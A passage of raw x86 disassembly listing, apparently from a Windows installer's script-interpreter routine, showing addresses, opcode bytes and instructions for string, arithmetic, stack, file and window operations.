  4016cf:	e8 38 43 00 00       	call   0x405a0c
  4016d4:	eb 09                	jmp    0x4016df
  4016d6:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4016dd:	88 1f                	mov    %bl,(%edi)
  4016df:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4016e2:	0f 85 a3 11 00 00    	jne    0x40288b
  4016e8:	68 00 04 00 00       	push   $0x400
  4016ed:	57                   	push   %edi
  4016ee:	57                   	push   %edi
  4016ef:	ff 15 68 70 40 00    	call   *0x407068
  4016f5:	e9 91 11 00 00       	jmp    0x40288b
  4016fa:	6a ff                	push   $0xffffffff
  4016fc:	e8 f5 12 00 00       	call   0x4029f6
  401701:	8d 4d 08             	lea    0x8(%ebp),%ecx
  401704:	51                   	push   %ecx
  401705:	56                   	push   %esi
  401706:	68 00 04 00 00       	push   $0x400
  40170b:	53                   	push   %ebx
  40170c:	50                   	push   %eax
  40170d:	53                   	push   %ebx
  40170e:	ff 15 64 70 40 00    	call   *0x407064
  401714:	85 c0                	test   %eax,%eax
  401716:	0f 85 6f 11 00 00    	jne    0x40288b
  40171c:	e9 0f 0f 00 00       	jmp    0x402630
  401721:	6a ef                	push   $0xffffffef
  401723:	e8 ce 12 00 00       	call   0x4029f6
  401728:	50                   	push   %eax
  401729:	56                   	push   %esi
  40172a:	e8 e3 3f 00 00       	call   0x405712
  40172f:	e9 72 fe ff ff       	jmp    0x4015a6
  401734:	6a 31                	push   $0x31
  401736:	e8 bb 12 00 00       	call   0x4029f6
  40173b:	8b f0                	mov    %eax,%esi
  40173d:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401740:	83 e0 07             	and    $0x7,%eax
  401743:	56                   	push   %esi
  401744:	89 75 f8             	mov    %esi,-0x8(%ebp)
  401747:	89 45 08             	mov    %eax,0x8(%ebp)
  40174a:	e8 1d 3e 00 00       	call   0x40556c
  40174f:	56                   	push   %esi
  401750:	be 80 9b 40 00       	mov    $0x409b80,%esi
  401755:	85 c0                	test   %eax,%eax
  401757:	74 08                	je     0x401761
  401759:	56                   	push   %esi
  40175a:	e8 ad 42 00 00       	call   0x405a0c
  40175f:	eb 17                	jmp    0x401778
  401761:	68 00 48 43 00       	push   $0x434800
  401766:	56                   	push   %esi
  401767:	e8 a0 42 00 00       	call   0x405a0c
  40176c:	50                   	push   %eax
  40176d:	e8 8d 3d 00 00       	call   0x4054ff
  401772:	50                   	push   %eax
  401773:	e8 b0 42 00 00       	call   0x405a28
  401778:	56                   	push   %esi
  401779:	e8 f0 44 00 00       	call   0x405c6e
  40177e:	bf 80 a3 40 00       	mov    $0x40a380,%edi
  401783:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  401787:	7c 31                	jl     0x4017ba
  401789:	56                   	push   %esi
  40178a:	e8 78 45 00 00       	call   0x405d07
  40178f:	33 c9                	xor    %ecx,%ecx
  401791:	3b c3                	cmp    %ebx,%eax
  401793:	74 10                	je     0x4017a5
  401795:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  401798:	83 c0 14             	add    $0x14,%eax
  40179b:	51                   	push   %ecx
  40179c:	50                   	push   %eax
  40179d:	ff 15 60 70 40 00    	call   *0x407060
  4017a3:	8b c8                	mov    %eax,%ecx
  4017a5:	8b 45 08             	mov    0x8(%ebp),%eax
  4017a8:	83 c0 fd             	add    $0xfffffffd,%eax
  4017ab:	0d 00 00 00 80       	or     $0x80000000,%eax
  4017b0:	23 c1                	and    %ecx,%eax
  4017b2:	f7 d8                	neg    %eax
  4017b4:	1b c0                	sbb    %eax,%eax
  4017b6:	40                   	inc    %eax
  4017b7:	89 45 08             	mov    %eax,0x8(%ebp)
  4017ba:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4017bd:	75 06                	jne    0x4017c5
  4017bf:	56                   	push   %esi
  4017c0:	e8 ff 3e 00 00       	call   0x4056c4
  4017c5:	33 c0                	xor    %eax,%eax
  4017c7:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  4017cb:	0f 95 c0             	setne  %al
  4017ce:	40                   	inc    %eax
  4017cf:	50                   	push   %eax
  4017d0:	68 00 00 00 40       	push   $0x40000000
  4017d5:	56                   	push   %esi
  4017d6:	e8 08 3f 00 00       	call   0x4056e3
  4017db:	83 f8 ff             	cmp    $0xffffffff,%eax
  4017de:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4017e1:	75 76                	jne    0x401859
  4017e3:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4017e6:	75 53                	jne    0x40183b
  4017e8:	68 00 f0 42 00       	push   $0x42f000
  4017ed:	57                   	push   %edi
  4017ee:	e8 19 42 00 00       	call   0x405a0c
  4017f3:	56                   	push   %esi
  4017f4:	68 00 f0 42 00       	push   $0x42f000
  4017f9:	e8 0e 42 00 00       	call   0x405a0c
  4017fe:	ff 75 f0             	push   -0x10(%ebp)
  401801:	68 80 9f 40 00       	push   $0x409f80
  401806:	e8 23 42 00 00       	call   0x405a2e
  40180b:	57                   	push   %edi
  40180c:	68 00 f0 42 00       	push   $0x42f000
  401811:	e8 f6 41 00 00       	call   0x405a0c
  401816:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401819:	c1 f8 03             	sar    $0x3,%eax
  40181c:	50                   	push   %eax
  40181d:	68 80 9f 40 00       	push   $0x409f80
  401822:	e8 a6 3a 00 00       	call   0x4052cd
  401827:	83 e8 04             	sub    $0x4,%eax
  40182a:	0f 84 53 ff ff ff    	je     0x401783
  401830:	48                   	dec    %eax
  401831:	74 1b                	je     0x40184e
  401833:	56                   	push   %esi
  401834:	6a fa                	push   $0xfffffffa
  401836:	e9 57 fc ff ff       	jmp    0x401492
  40183b:	ff 75 f8             	push   -0x8(%ebp)
  40183e:	6a e2                	push   $0xffffffe2
  401840:	e8 65 35 00 00       	call   0x404daa
  401845:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  401849:	e9 5a fd ff ff       	jmp    0x4015a8
  40184e:	ff 05 e8 eb 42 00    	incl   0x42ebe8
  401854:	e9 3b 10 00 00       	jmp    0x402894
  401859:	ff 75 f8             	push   -0x8(%ebp)
  40185c:	6a ea                	push   $0xffffffea
  40185e:	e8 47 35 00 00       	call   0x404daa
  401863:	ff 05 14 ec 42 00    	incl   0x42ec14
  401869:	53                   	push   %ebx
  40186a:	53                   	push   %ebx
  40186b:	ff 75 cc             	push   -0x34(%ebp)
  40186e:	ff 75 e4             	push   -0x1c(%ebp)
  401871:	e8 e5 15 00 00       	call   0x402e5b
  401876:	ff 0d 14 ec 42 00    	decl   0x42ec14
  40187c:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
  401880:	8b f8                	mov    %eax,%edi
  401882:	75 06                	jne    0x40188a
  401884:	83 7d ec ff          	cmpl   $0xffffffff,-0x14(%ebp)
  401888:	74 12                	je     0x40189c
  40188a:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40188d:	50                   	push   %eax
  40188e:	8d 45 e8             	lea    -0x18(%ebp),%eax
  401891:	53                   	push   %ebx
  401892:	50                   	push   %eax
  401893:	ff 75 cc             	push   -0x34(%ebp)
  401896:	ff 15 a8 70 40 00    	call   *0x4070a8
  40189c:	ff 75 cc             	push   -0x34(%ebp)
  40189f:	ff 15 ec 70 40 00    	call   *0x4070ec
  4018a5:	3b fb                	cmp    %ebx,%edi
  4018a7:	0f 8d de 0f 00 00    	jge    0x40288b
  4018ad:	83 ff fe             	cmp    $0xfffffffe,%edi
  4018b0:	75 13                	jne    0x4018c5
  4018b2:	6a e9                	push   $0xffffffe9
  4018b4:	56                   	push   %esi
  4018b5:	e8 74 41 00 00       	call   0x405a2e
  4018ba:	ff 75 f8             	push   -0x8(%ebp)
  4018bd:	56                   	push   %esi
  4018be:	e8 65 41 00 00       	call   0x405a28
  4018c3:	eb 08                	jmp    0x4018cd
  4018c5:	6a ee                	push   $0xffffffee
  4018c7:	56                   	push   %esi
  4018c8:	e8 61 41 00 00       	call   0x405a2e
  4018cd:	68 10 00 20 00       	push   $0x200010
  4018d2:	56                   	push   %esi
  4018d3:	e9 31 09 00 00       	jmp    0x402209
  4018d8:	53                   	push   %ebx
  4018d9:	eb 34                	jmp    0x40190f
  4018db:	6a 31                	push   $0x31
  4018dd:	e8 14 11 00 00       	call   0x4029f6
  4018e2:	ff 75 dc             	push   -0x24(%ebp)
  4018e5:	50                   	push   %eax
  4018e6:	e8 e2 39 00 00       	call   0x4052cd
  4018eb:	3b c3                	cmp    %ebx,%eax
  4018ed:	0f 84 69 0d 00 00    	je     0x40265c
  4018f3:	3b 45 e4             	cmp    -0x1c(%ebp),%eax
  4018f6:	0f 84 4a 01 00 00    	je     0x401a46
  4018fc:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  4018ff:	0f 85 86 0f 00 00    	jne    0x40288b
  401905:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401908:	e9 89 0f 00 00       	jmp    0x402896
  40190d:	6a f0                	push   $0xfffffff0
  40190f:	e8 e2 10 00 00       	call   0x4029f6
  401914:	ff 75 e0             	push   -0x20(%ebp)
  401917:	50                   	push   %eax
  401918:	e8 14 3a 00 00       	call   0x405331
  40191d:	e9 69 0f 00 00       	jmp    0x40288b
  401922:	6a 01                	push   $0x1
  401924:	e8 cd 10 00 00       	call   0x4029f6
  401929:	50                   	push   %eax
  40192a:	e8 f3 40 00 00       	call   0x405a22
  40192f:	e9 84 0b 00 00       	jmp    0x4024b8
  401934:	6a 02                	push   $0x2
  401936:	e8 9e 10 00 00       	call   0x4029d9
  40193b:	6a 03                	push   $0x3
  40193d:	89 45 08             	mov    %eax,0x8(%ebp)
  401940:	e8 94 10 00 00       	call   0x4029d9
  401945:	6a 01                	push   $0x1
  401947:	8b f8                	mov    %eax,%edi
  401949:	e8 a8 10 00 00       	call   0x4029f6
  40194e:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401951:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  401954:	88 1e                	mov    %bl,(%esi)
  401956:	74 09                	je     0x401961
  401958:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40195b:	0f 84 2a 0f 00 00    	je     0x40288b
  401961:	50                   	push   %eax
  401962:	e8 bb 40 00 00       	call   0x405a22
  401967:	3b fb                	cmp    %ebx,%edi
  401969:	7d 08                	jge    0x401973
  40196b:	03 f8                	add    %eax,%edi
  40196d:	0f 88 18 0f 00 00    	js     0x40288b
  401973:	3b f8                	cmp    %eax,%edi
  401975:	7e 02                	jle    0x401979
  401977:	8b f8                	mov    %eax,%edi
  401979:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40197c:	03 c7                	add    %edi,%eax
  40197e:	50                   	push   %eax
  40197f:	56                   	push   %esi
  401980:	e8 87 40 00 00       	call   0x405a0c
  401985:	8b 7d 08             	mov    0x8(%ebp),%edi
  401988:	3b fb                	cmp    %ebx,%edi
  40198a:	0f 84 fb 0e 00 00    	je     0x40288b
  401990:	7d 0f                	jge    0x4019a1
  401992:	56                   	push   %esi
  401993:	e8 8a 40 00 00       	call   0x405a22
  401998:	03 f8                	add    %eax,%edi
  40199a:	79 05                	jns    0x4019a1
  40199c:	89 5d 08             	mov    %ebx,0x8(%ebp)
  40199f:	8b fb                	mov    %ebx,%edi
  4019a1:	81 ff 00 04 00 00    	cmp    $0x400,%edi
  4019a7:	0f 8d de 0e 00 00    	jge    0x40288b
  4019ad:	88 1c 37             	mov    %bl,(%edi,%esi,1)
  4019b0:	e9 d6 0e 00 00       	jmp    0x40288b
  4019b5:	6a 20                	push   $0x20
  4019b7:	e8 3a 10 00 00       	call   0x4029f6
  4019bc:	6a 31                	push   $0x31
  4019be:	8b f0                	mov    %eax,%esi
  4019c0:	e8 31 10 00 00       	call   0x4029f6
  4019c5:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  4019c8:	50                   	push   %eax
  4019c9:	56                   	push   %esi
  4019ca:	75 12                	jne    0x4019de
  4019cc:	ff 15 f0 70 40 00    	call   *0x4070f0
  4019d2:	85 c0                	test   %eax,%eax
  4019d4:	75 70                	jne    0x401a46
  4019d6:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4019d9:	e9 b8 0e 00 00       	jmp    0x402896
  4019de:	ff 15 f4 70 40 00    	call   *0x4070f4
  4019e4:	eb ec                	jmp    0x4019d2
  4019e6:	33 ff                	xor    %edi,%edi
  4019e8:	47                   	inc    %edi
  4019e9:	57                   	push   %edi
  4019ea:	e8 07 10 00 00       	call   0x4029f6
  4019ef:	68 00 04 00 00       	push   $0x400
  4019f4:	56                   	push   %esi
  4019f5:	50                   	push   %eax
  4019f6:	89 45 08             	mov    %eax,0x8(%ebp)
  4019f9:	ff 15 f8 70 40 00    	call   *0x4070f8
  4019ff:	85 c0                	test   %eax,%eax
  401a01:	74 13                	je     0x401a16
  401a03:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401a06:	74 13                	je     0x401a1b
  401a08:	56                   	push   %esi
  401a09:	ff 75 08             	push   0x8(%ebp)
  401a0c:	ff 15 f4 70 40 00    	call   *0x4070f4
  401a12:	85 c0                	test   %eax,%eax
  401a14:	75 05                	jne    0x401a1b
  401a16:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401a19:	88 1e                	mov    %bl,(%esi)
  401a1b:	88 9e ff 03 00 00    	mov    %bl,0x3ff(%esi)
  401a21:	e9 65 0e 00 00       	jmp    0x40288b
  401a26:	53                   	push   %ebx
  401a27:	e8 ad 0f 00 00       	call   0x4029d9
  401a2c:	6a 01                	push   $0x1
  401a2e:	8b f0                	mov    %eax,%esi
  401a30:	e8 a4 0f 00 00       	call   0x4029d9
  401a35:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  401a38:	75 08                	jne    0x401a42
  401a3a:	3b f0                	cmp    %eax,%esi
  401a3c:	7c 08                	jl     0x401a46
  401a3e:	7e 96                	jle    0x4019d6
  401a40:	eb 0e                	jmp    0x401a50
  401a42:	3b f0                	cmp    %eax,%esi
  401a44:	73 08                	jae    0x401a4e
  401a46:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401a49:	e9 48 0e 00 00       	jmp    0x402896
  401a4e:	76 86                	jbe    0x4019d6
  401a50:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401a53:	e9 3e 0e 00 00       	jmp    0x402896
  401a58:	6a 01                	push   $0x1
  401a5a:	e8 7a 0f 00 00       	call   0x4029d9
  401a5f:	6a 02                	push   $0x2
  401a61:	8b f8                	mov    %eax,%edi
  401a63:	e8 71 0f 00 00       	call   0x4029d9
  401a68:	8b c8                	mov    %eax,%ecx
  401a6a:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401a6d:	83 f8 0c             	cmp    $0xc,%eax
  401a70:	77 6d                	ja     0x401adf
  401a72:	ff 24 85 a5 29 40 00 	jmp    *0x4029a5(,%eax,4)
  401a79:	03 f9                	add    %ecx,%edi
  401a7b:	eb 62                	jmp    0x401adf
  401a7d:	2b f9                	sub    %ecx,%edi
  401a7f:	eb 5e                	jmp    0x401adf
  401a81:	0f af cf             	imul   %edi,%ecx
  401a84:	8b f9                	mov    %ecx,%edi
  401a86:	eb 57                	jmp    0x401adf
  401a88:	3b cb                	cmp    %ebx,%ecx
  401a8a:	74 42                	je     0x401ace
  401a8c:	8b c7                	mov    %edi,%eax
  401a8e:	99                   	cltd
  401a8f:	f7 f9                	idiv   %ecx
  401a91:	8b f8                	mov    %eax,%edi
  401a93:	eb 4a                	jmp    0x401adf
  401a95:	0b f9                	or     %ecx,%edi
  401a97:	eb 46                	jmp    0x401adf
  401a99:	23 f9                	and    %ecx,%edi
  401a9b:	eb 42                	jmp    0x401adf
  401a9d:	33 f9                	xor    %ecx,%edi
  401a9f:	eb 3e                	jmp    0x401adf
  401aa1:	33 c0                	xor    %eax,%eax
  401aa3:	3b fb                	cmp    %ebx,%edi
  401aa5:	0f 94 c0             	sete   %al
  401aa8:	eb e7                	jmp    0x401a91
  401aaa:	3b fb                	cmp    %ebx,%edi
  401aac:	75 0e                	jne    0x401abc
  401aae:	eb 08                	jmp    0x401ab8
  401ab0:	33 ff                	xor    %edi,%edi
  401ab2:	eb 2b                	jmp    0x401adf
  401ab4:	3b fb                	cmp    %ebx,%edi
  401ab6:	74 f8                	je     0x401ab0
  401ab8:	3b cb                	cmp    %ebx,%ecx
  401aba:	74 f4                	je     0x401ab0
  401abc:	33 ff                	xor    %edi,%edi
  401abe:	47                   	inc    %edi
  401abf:	eb 1e                	jmp    0x401adf
  401ac1:	3b cb                	cmp    %ebx,%ecx
  401ac3:	74 09                	je     0x401ace
  401ac5:	8b c7                	mov    %edi,%eax
  401ac7:	99                   	cltd
  401ac8:	f7 f9                	idiv   %ecx
  401aca:	8b fa                	mov    %edx,%edi
  401acc:	eb 11                	jmp    0x401adf
  401ace:	33 ff                	xor    %edi,%edi
  401ad0:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401ad7:	eb 06                	jmp    0x401adf
  401ad9:	d3 e7                	shl    %cl,%edi
  401adb:	eb 02                	jmp    0x401adf
  401add:	d3 ff                	sar    %cl,%edi
  401adf:	57                   	push   %edi
  401ae0:	e9 7c fa ff ff       	jmp    0x401561
  401ae5:	6a 01                	push   $0x1
  401ae7:	e8 0a 0f 00 00       	call   0x4029f6
  401aec:	6a 02                	push   $0x2
  401aee:	8b f8                	mov    %eax,%edi
  401af0:	e8 e4 0e 00 00       	call   0x4029d9
  401af5:	50                   	push   %eax
  401af6:	57                   	push   %edi
  401af7:	56                   	push   %esi
  401af8:	ff 15 00 72 40 00    	call   *0x407200
  401afe:	83 c4 0c             	add    $0xc,%esp
  401b01:	e9 85 0d 00 00       	jmp    0x40288b
  401b06:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401b09:	8b 3d 80 af 40 00    	mov    0x40af80,%edi
  401b0f:	3b c3                	cmp    %ebx,%eax
  401b11:	74 44                	je     0x401b57
  401b13:	48                   	dec    %eax
  401b14:	3b fb                	cmp    %ebx,%edi
  401b16:	0f 84 df 06 00 00    	je     0x4021fb
  401b1c:	8b 3f                	mov    (%edi),%edi
  401b1e:	3b c3                	cmp    %ebx,%eax
  401b20:	75 f1                	jne    0x401b13
  401b22:	3b fb                	cmp    %ebx,%edi
  401b24:	0f 84 d1 06 00 00    	je     0x4021fb
  401b2a:	83 c7 04             	add    $0x4,%edi
  401b2d:	be 80 9b 40 00       	mov    $0x409b80,%esi
  401b32:	57                   	push   %edi
  401b33:	56                   	push   %esi
  401b34:	e8 d3 3e 00 00       	call   0x405a0c
  401b39:	a1 80 af 40 00       	mov    0x40af80,%eax
  401b3e:	83 c0 04             	add    $0x4,%eax
  401b41:	50                   	push   %eax
  401b42:	57                   	push   %edi
  401b43:	e8 c4 3e 00 00       	call   0x405a0c
  401b48:	a1 80 af 40 00       	mov    0x40af80,%eax
  401b4d:	56                   	push   %esi
  401b4e:	83 c0 04             	add    $0x4,%eax
  401b51:	50                   	push   %eax
  401b52:	e9 5a 0c 00 00       	jmp    0x4027b1
  401b57:	3b d3                	cmp    %ebx,%edx
  401b59:	74 25                	je     0x401b80
  401b5b:	3b fb                	cmp    %ebx,%edi
  401b5d:	0f 84 f9 0a 00 00    	je     0x40265c
  401b63:	8d 47 04             	lea    0x4(%edi),%eax
  401b66:	50                   	push   %eax
  401b67:	56                   	push   %esi
  401b68:	e8 9f 3e 00 00       	call   0x405a0c
  401b6d:	8b 07                	mov    (%edi),%eax
  401b6f:	57                   	push   %edi
  401b70:	a3 80 af 40 00       	mov    %eax,0x40af80
  401b75:	ff 15 fc 70 40 00    	call   *0x4070fc
  401b7b:	e9 0b 0d 00 00       	jmp    0x40288b
  401b80:	68 04 04 00 00       	push   $0x404
  401b85:	6a 40                	push   $0x40
  401b87:	ff 15 00 71 40 00    	call   *0x407100
  401b8d:	ff 75 dc             	push   -0x24(%ebp)
  401b90:	8b f0                	mov    %eax,%esi
  401b92:	8d 46 04             	lea    0x4(%esi),%eax
  401b95:	50                   	push   %eax
  401b96:	e8 93 3e 00 00       	call   0x405a2e
  401b9b:	a1 80 af 40 00       	mov    0x40af80,%eax
  401ba0:	89 06                	mov    %eax,(%esi)
  401ba2:	89 35 80 af 40 00    	mov    %esi,0x40af80
  401ba8:	e9 de 0c 00 00       	jmp    0x40288b
  401bad:	6a 03                	push   $0x3
  401baf:	e8 25 0e 00 00       	call   0x4029d9
  401bb4:	6a 04                	push   $0x4
  401bb6:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401bb9:	e8 1b 0e 00 00       	call   0x4029d9
  401bbe:	f6 45 f0 01          	testb  $0x1,-0x10(%ebp)
  401bc2:	89 45 08             	mov    %eax,0x8(%ebp)
  401bc5:	74 0a                	je     0x401bd1
  401bc7:	6a 33                	push   $0x33
  401bc9:	e8 28 0e 00 00       	call   0x4029f6
  401bce:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401bd1:	f6 45 f0 02          	testb  $0x2,-0x10(%ebp)
  401bd5:	74 0a                	je     0x401be1
  401bd7:	6a 44                	push   $0x44
  401bd9:	e8 18 0e 00 00       	call   0x4029f6
  401bde:	89 45 08             	mov    %eax,0x8(%ebp)
  401be1:	83 7d d8 21          	cmpl   $0x21,-0x28(%ebp)
  401be5:	6a 01                	push   $0x1
  401be7:	75 44                	jne    0x401c2d
  401be9:	e8 eb 0d 00 00       	call   0x4029d9
  401bee:	6a 02                	push   $0x2
  401bf0:	8b f8                	mov    %eax,%edi
  401bf2:	e8 e2 0d 00 00       	call   0x4029d9
  401bf7:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401bfa:	c1 f9 02             	sar    $0x2,%ecx
  401bfd:	74 1e                	je     0x401c1d
  401bff:	8d 55 f8             	lea    -0x8(%ebp),%edx
  401c02:	52                   	push   %edx
  401c03:	51                   	push   %ecx
  401c04:	53                   	push   %ebx
  401c05:	ff 75 08             	push   0x8(%ebp)
  401c08:	ff 75 cc             	push   -0x34(%ebp)
  401c0b:	50                   	push   %eax
  401c0c:	57                   	push   %edi
  401c0d:	ff 15 04 72 40 00    	call   *0x407204
  401c13:	f7 d8                	neg    %eax
  401c15:	1b c0                	sbb    %eax,%eax
  401c17:	40                   	inc    %eax
  401c18:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401c1b:	eb 3f                	jmp    0x401c5c
  401c1d:	ff 75 08             	push   0x8(%ebp)
  401c20:	ff 75 cc             	push   -0x34(%ebp)
  401c23:	50                   	push   %eax
  401c24:	57                   	push   %edi
  401c25:	ff 15 44 72 40 00    	call   *0x407244
  401c2b:	eb 2c                	jmp    0x401c59
  401c2d:	e8 c4 0d 00 00       	call   0x4029f6
  401c32:	6a 12                	push   $0x12
  401c34:	8b f8                	mov    %eax,%edi
  401c36:	e8 bb 0d 00 00       	call   0x4029f6
  401c3b:	8a 08                	mov    (%eax),%cl
  401c3d:	f6 d9                	neg    %cl
  401c3f:	1b c9                	sbb    %ecx,%ecx
  401c41:	23 c8                	and    %eax,%ecx
  401c43:	8a 07                	mov    (%edi),%al
  401c45:	f6 d8                	neg    %al
  401c47:	1b c0                	sbb    %eax,%eax
  401c49:	51                   	push   %ecx
  401c4a:	23 c7                	and    %edi,%eax
  401c4c:	50                   	push   %eax
  401c4d:	ff 75 08             	push   0x8(%ebp)
  401c50:	ff 75 cc             	push   -0x34(%ebp)
  401c53:	ff 15 08 72 40 00    	call   *0x407208
  401c59:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c5c:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401c5f:	0f 8c 26 0c 00 00    	jl     0x40288b
  401c65:	ff 75 f8             	push   -0x8(%ebp)
  401c68:	e9 f4 f8 ff ff       	jmp    0x401561
  401c6d:	53                   	push   %ebx
  401c6e:	e8 66 0d 00 00       	call   0x4029d9
  401c73:	50                   	push   %eax
  401c74:	ff 15 28 72 40 00    	call   *0x407228
  401c7a:	85 c0                	test   %eax,%eax
  401c7c:	0f 84 54 fd ff ff    	je     0x4019d6
  401c82:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401c85:	e9 0c 0c 00 00       	jmp    0x402896
  401c8a:	6a 02                	push   $0x2
  401c8c:	e8 48 0d 00 00       	call   0x4029d9
  401c91:	50                   	push   %eax
  401c92:	6a 01                	push   $0x1
  401c94:	e8 40 0d 00 00       	call   0x4029d9
  401c99:	50                   	push   %eax
  401c9a:	ff 15 2c 72 40 00    	call   *0x40722c
  401ca0:	e9 13 08 00 00       	jmp    0x4024b8
  401ca5:	a1 a8 eb 42 00       	mov    0x42eba8,%eax
  401caa:	03 c2                	add    %edx,%eax
  401cac:	50                   	push   %eax
  401cad:	6a eb                	push   $0xffffffeb
  401caf:	53                   	push   %ebx
  401cb0:	e8 24 0d 00 00       	call   0x4029d9
  401cb5:	50                   	push   %eax
  401cb6:	ff 15 30 72 40 00    	call   *0x407230
  401cbc:	e9 ca 0b 00 00       	jmp    0x40288b
  401cc1:	52                   	push   %edx
  401cc2:	ff 75 cc             	push   -0x34(%ebp)
  401cc5:	ff 15 2c 72 40 00    	call   *0x40722c
  401ccb:	8b f0                	mov    %eax,%esi
  401ccd:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401cd0:	50                   	push   %eax
  401cd1:	56                   	push   %esi
  401cd2:	ff 15 50 72 40 00    	call   *0x407250
  401cd8:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401cdb:	6a 10                	push   $0x10
  401cdd:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  401ce1:	50                   	push   %eax
  401ce2:	8b 45 c8             	mov    -0x38(%ebp),%eax
  401ce5:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  401ce9:	50                   	push   %eax
  401cea:	53                   	push   %ebx
  401ceb:	53                   	push   %ebx
  401cec:	e8 05 0d 00 00       	call   0x4029f6
  401cf1:	50                   	push   %eax
  401cf2:	53                   	push   %ebx
  401cf3:	ff 15 34 72 40 00    	call   *0x407234
  401cf9:	50                   	push   %eax
  401cfa:	53                   	push   %ebx
  401cfb:	68 72 01 00 00       	push   $0x172
  401d00:	56                   	push   %esi
  401d01:	ff 15 44 72 40 00    	call   *0x407244
  401d07:	3b c3                	cmp    %ebx,%eax
  401d09:	0f 84 7c 0b 00 00    	je     0x40288b
  401d0f:	50                   	push   %eax
  401d10:	ff 15 44 70 40 00    	call   *0x407044
  401d16:	e9 70 0b 00 00       	jmp    0x40288b
  401d1b:	6a 48                	push   $0x48
  401d1d:	6a 5a                	push   $0x5a
  401d1f:	ff 75 cc             	push   -0x34(%ebp)
  401d22:	ff 15 38 72 40 00    	call   *0x407238
  401d28:	50                   	push   %eax
  401d29:	ff 15 40 70 40 00    	call   *0x407040
  401d2f:	50                   	push   %eax
  401d30:	6a 02                	push   $0x2
  401d32:	e8 a2 0c 00 00       	call   0x4029d9
  401d37:	50                   	push   %eax
  401d38:	ff 15 30 71 40 00    	call   *0x407130
  401d3e:	f7 d8                	neg    %eax
  401d40:	6a 03                	push   $0x3
  401d42:	a3 84 af 40 00       	mov    %eax,0x40af84
  401d47:	e8 8d 0c 00 00       	call   0x4029d9
  401d4c:	a3 94 af 40 00       	mov    %eax,0x40af94
  401d51:	8a 45 ec             	mov    -0x14(%ebp),%al
  401d54:	ff 75 e0             	push   -0x20(%ebp)
  401d57:	8a c8                	mov    %al,%cl
  401d59:	80 e1 01             	and    $0x1,%cl
  401d5c:	c6 05 9b af 40 00 01 	movb   $0x1,0x40af9b
  401d63:	88 0d 98 af 40 00    	mov    %cl,0x40af98
  401d69:	8a c8                	mov    %al,%cl
  401d6b:	80 e1 02             	and    $0x2,%cl
  401d6e:	24 04                	and    $0x4,%al
  401d70:	68 a0 af 40 00       	push   $0x40afa0
  401d75:	88 0d 99 af 40 00    	mov    %cl,0x40af99
  401d7b:	a2 9a af 40 00       	mov    %al,0x40af9a
  401d80:	e8 a9 3c 00 00       	call   0x405a2e
  401d85:	68 84 af 40 00       	push   $0x40af84
  401d8a:	ff 15 4c 70 40 00    	call   *0x40704c
  401d90:	e9 23 07 00 00       	jmp    0x4024b8
  401d95:	53                   	push   %ebx
  401d96:	e8 3e 0c 00 00       	call   0x4029d9
  401d9b:	6a 01                	push   $0x1
  401d9d:	8b f0                	mov    %eax,%esi
  401d9f:	e8 35 0c 00 00       	call   0x4029d9
  401da4:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  401da7:	50                   	push   %eax
  401da8:	56                   	push   %esi
  401da9:	75 0b                	jne    0x401db6
  401dab:	ff 15 60 72 40 00    	call   *0x407260
  401db1:	e9 d5 0a 00 00       	jmp    0x40288b
  401db6:	ff 15 3c 72 40 00    	call   *0x40723c
  401dbc:	e9 ca 0a 00 00       	jmp    0x40288b
  401dc1:	53                   	push   %ebx
  401dc2:	e8 2f 0c 00 00       	call   0x4029f6
  401dc7:	6a 31                	push   $0x31
  401dc9:	8b f0                	mov    %eax,%esi
  401dcb:	e8 26 0c 00 00       	call   0x4029f6
  401dd0:	6a 22                	push   $0x22
  401dd2:	8b d8                	mov    %eax,%ebx
  401dd4:	e8 1d 0c 00 00       	call   0x4029f6
  401dd9:	6a 15                	push   $0x15
  401ddb:	8b f8                	mov    %eax,%edi
  401ddd:	e8 14 0c 00 00       	call   0x4029f6
  401de2:	6a ec                	push   $0xffffffec
  401de4:	e8 3a f6 ff ff       	call   0x401423
  401de9:	8a 07                	mov    (%edi),%al
  401deb:	ff 75 e8             	push   -0x18(%ebp)
  401dee:	f6 d8                	neg    %al
  401df0:	1b c0                	sbb    %eax,%eax
  401df2:	68 00 48 43 00       	push   $0x434800
  401df7:	23 c7                	and    %edi,%eax
  401df9:	50                   	push   %eax
  401dfa:	8a 06                	mov    (%esi),%al
